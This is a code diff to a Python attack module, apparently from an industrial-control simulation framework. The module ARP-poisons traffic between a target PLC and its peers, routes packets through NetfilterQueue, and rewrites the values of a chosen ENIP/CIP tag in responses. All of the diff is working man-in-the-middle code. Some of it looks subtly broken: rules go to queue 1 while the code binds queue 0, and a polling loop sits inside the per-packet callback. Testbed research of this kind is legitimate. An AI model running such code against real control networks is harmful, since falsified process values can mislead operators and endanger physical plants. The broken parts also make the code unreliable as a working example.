@@ -5,14 +5,27 @@ import traceback
 from pathlib import Path
 import threading
 
-import fnfqueue
+from dhalsim.network_attacks.enip_cip_parser import cip
+
+from netfilterqueue import NetfilterQueue
 from scapy.layers.inet import IP, TCP
 from scapy.packet import Raw
 
 from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp, \
-    translate_payload_to_float, translate_float_to_payload
+    translate_payload_to_float, translate_float_to_payload, get_mac, spoof_arp_cache
 from dhalsim.network_attacks.synced_attack import SyncedAttack
 
+nfqueue = NetfilterQueue()
+
+
+import _thread
+
+class Error(Exception):
+    """Base class for exceptions in this module."""
+
+
+class DirectionError(Error):
+    """Raised when the optional parameter direction does not have source or destination as value"""
 
 class ConcealmentAttack(SyncedAttack):
     """
@@ -32,6 +45,10 @@ class ConcealmentAttack(SyncedAttack):
     :param yaml_index: The index of the attack in the intermediate YAML
     """
 
+    ARP_POISON_PERIOD = 15
+    """Period in seconds of arp poison"""
+
+
     def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
         super().__init__(intermediate_yaml_path, yaml_index)
         os.system('sysctl net.ipv4.ip_forward=1')
@@ -39,6 +56,10 @@ class ConcealmentAttack(SyncedAttack):
         self.q = None
         self.thread = None
         self.run_thread = False
+        self.attacked_tag = self.intermediate_attack['tag']
+
+        # The session id is used to pair CIP requests (with the tag name), with their responses (with the tag value)
+        self.session_id = 0
 
     def setup(self):
         """
@@ -53,34 +74,59 @@ class ConcealmentAttack(SyncedAttack):
 
         Finally, it launches the thread that will examine all captured packets.
         """
-        os.system(
-            f'iptables -t mangle -A FORWARD -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE --queue-num 1')
+        #os.system(f'iptables -t mangle -A FORWARD -p tcp -d {self.target_plc_ip} -j NFQUEUE --queue-num 1')
+        os.system(f'iptables -t mangle -A FORWARD -p tcp -j NFQUEUE --queue-num 1')
+
+
         os.system('iptables -A FORWARD -p icmp -j DROP')
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
 
+        self.logger.info(f"NFqueue Bound periodic ARP Poison between {self.target_plc_ip} and "
+                          f"{self.intermediate_attack['gateway_ip']}")
         # Launch the ARP poison by sending the required ARP network packets
-        launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
+        self.launch_mitm(get_macs=True)
+        self.logger.info(f"Configured ARP Poison between {self.target_plc_ip} and "
+                         f"{self.intermediate_attack['gateway_ip']}")
+
+        self.logger.debug('Tag being attacked: ' + str(self.attacked_tag))
+
+        nfqueue.bind(0, self.capture)
+        nfqueue.run(block=False)
+
+        # Refresh ARP poison
+        #_thread.start_new_thread(self.refresh_poison, (self.ARP_POISON_PERIOD, self.ARP_POISON_PERIOD))
+
+    def refresh_poison(self, period, delay):
+        time.sleep(delay)
+        while self.run_thread:
+            self.launch_mitm(get_macs=False)
+            time.sleep(period)
+
+    def launch_mitm(self, get_macs=False):
         if self.intermediate_yaml['network_topology_type'] == "simple":
             for plc in self.intermediate_yaml['plcs']:
                 if plc['name'] != self.intermediate_plc['name']:
-                    launch_arp_poison(self.target_plc_ip, plc['local_ip'])
 
-        self.logger.debug(f"Naive MITM Attack ARP Poison between {self.target_plc_ip} and "
+                    if get_macs:
+                        self.mac_target_source = get_mac(self.target_plc_ip)
+                        self.mac_target_destination = get_mac(plc['local_ip'])
+
+                    spoof_arp_cache(self.target_plc_ip, self.mac_target_source, plc['local_ip'])
+                    spoof_arp_cache(plc['local_ip'], self.mac_target_destination, self.target_plc_ip)
+
+        else:
+            if get_macs:
+                self.mac_target_source = get_mac(self.target_plc_ip)
+                self.mac_target_destination = get_mac(self.intermediate_attack['gateway_ip'])
+
+            spoof_arp_cache(self.target_plc_ip, self.mac_target_source, self.intermediate_attack['gateway_ip'])
+            spoof_arp_cache(self.intermediate_attack['gateway_ip'], self.mac_target_destination, self.target_plc_ip)
+
+        self.logger.info(f"ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-        try:
-            self.queue = fnfqueue.Connection()
-            self.q = self.queue.bind(1)
-            self.q.set_mode(fnfqueue.MAX_PAYLOAD, fnfqueue.COPY_PACKET)
-        except PermissionError:
-            self.logger.error("Permission Error trying to bind to the NFQUEUE")
-
-        self.run_thread = True
-        self.thread = threading.Thread(target=self.packet_thread_function)
-        self.thread.start()
-
-    def packet_thread_function(self):
+    def capture(self, packet):
         """
         This function is the function that will run in the thread started in the setup function.
 
@@ -90,28 +136,48 @@ class ConcealmentAttack(SyncedAttack):
         """
         while self.run_thread:
             try:
-                for packet in self.queue:
-                    p = IP(packet.payload)
-                    # Packets with 100 <= length < 116 are CIP response packets
-                    if 100 <= p[IP].len < 116:
-                        if 'value' in self.intermediate_attack.keys():
-                            p[Raw].load = translate_float_to_payload(
-                                self.intermediate_attack['value'], p[Raw].load)
-                        elif 'offset' in self.intermediate_attack.keys():
-                            p[Raw].load = translate_float_to_payload(
-                                translate_payload_to_float(p[Raw].load) + self.intermediate_attack[
-                                    'offset'], p[Raw].load)
+                p = IP(packet.payload)
+                #self.logger.debug('packet')
+                #self.logger.debug(p.show())
+                if 'ENIP_SendRRData' in p:
+                    # This type of packet carries the tag name
+                    #self.logger.debug('ENIP_SendRRData')
+                    #self.logger.debug(p.show())
+                    if 'CIP_ReqConnectionManager' in p:
+                        tag_name = p[Raw].load.decode(encoding='latin-1').split(':')[0][8:]
+                        self.logger.debug('ENIP TCP Session ID: ' + str(p['ENIP_TCP'].session))
+                        self.logger.debug('Received tag: ' + tag_name)
 
-                        del p[TCP].chksum
-                        del p[IP].chksum
+                        if self.attacked_tag == tag_name:
+                            self.logger.debug('Modifying tag: ' + str(tag_name))
+                            self.session_id = p['ENIP_TCP'].session
 
-                        packet.payload = bytes(p)
-                        self.logger.debug(f"Value of network packet for {p[IP].dst} overwritten.")
+                    else:
+                        this_session = p['ENIP_TCP'].session
+                        if self.session_id == this_session:
+                            value = translate_payload_to_float(p[Raw].load)
+                            self.logger.debug('tag value is:' + str(value))
+                            self.logger.debug('Tag ' + self.attacked_tag + ' is going to be modified')
 
-                    packet.mangle()
+                            if 'value' in self.intermediate_attack.keys():
+                                p[Raw].load = translate_float_to_payload(
+                                    self.intermediate_attack['value'], p[Raw].load)
+                            elif 'offset' in self.intermediate_attack.keys():
+                                self.logger.debug('Offsetting value')
+                                p[Raw].load = translate_float_to_payload(
+                                    translate_payload_to_float(p[Raw].load) + self.intermediate_attack[
+                                        'offset'], p[Raw].load)
 
-            except fnfqueue.BufferOverflowException:
-                print("Buffer Overflow in a MITM attack!")
+                            self.logger.debug\
+                                ('New payload tag value is: ' + str(translate_payload_to_float(p[Raw].load)))
+
+                            del p[TCP].chksum
+                            del p[IP].chksum
+
+                            packet.set_payload(bytes(p))
+                            self.logger.debug(f"Value of network packet for {p[IP].dst} overwritten.")
+
+                packet.accept()
             except Exception as exc:
                 print("Exception in a MITM attack!:", exc)
                 print(traceback.format_exc())
@@ -141,16 +207,16 @@ class ConcealmentAttack(SyncedAttack):
                           f"{self.intermediate_attack['gateway_ip']}")
 
         os.system(
-            f'iptables -t mangle -D FORWARD -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE --queue-num 1')
+            f'iptables -t mangle -D FORWARD -p tcp -j NFQUEUE --queue-num 1')
+
         os.system('iptables -D FORWARD -p icmp -j DROP')
         os.system('iptables -D INPUT -p icmp -j DROP')
         os.system('iptables -D OUTPUT -p icmp -j DROP')
 
         self.run_thread = False
-        self.q.unbind()
         time.sleep(0.5)
-        self.queue.close()
-        self.thread.join()
+        nfqueue.unbind()
+        #self.thread.join()
 
     def attack_step(self):
         """This function just passes, as there is no required action in an attack step."""
